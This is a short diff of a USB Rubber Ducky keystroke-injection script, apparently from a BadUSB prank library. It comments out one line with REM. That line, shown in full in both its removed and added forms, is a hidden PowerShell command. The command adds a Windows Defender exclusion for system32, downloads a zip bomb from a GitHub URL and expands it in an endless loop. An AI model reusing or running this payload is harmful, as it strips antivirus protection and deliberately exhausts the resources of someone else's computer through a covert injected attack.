@@ -15,5 +15,5 @@ ENTER
 DELAY 2000
 ALT y
 DELAY 2000
-STRING powershell -w h Add-MpPreference -ExclusionPath C:\Windows\system32 ;; curl https://github.com/FalsePhilosopher/BadUSB-Playground/raw/main/Ducky/USBRubberducky/library/prank/Unix-like/Linux/Bombs/zip_bomb/42.zip -OutFile 42.zip ;; while (1) { Expand-Archive -Path 42.zip -Force; }
+REM STRING powershell -w h Add-MpPreference -ExclusionPath C:\Windows\system32 ;; curl https://github.com/FalsePhilosopher/BadUSB-Playground/raw/main/Ducky/USBRubberducky/library/prank/Unix-like/Linux/Bombs/zip_bomb/42.zip -OutFile 42.zip ;; while (1) { Expand-Archive -Path 42.zip -Force; }
 ENTER
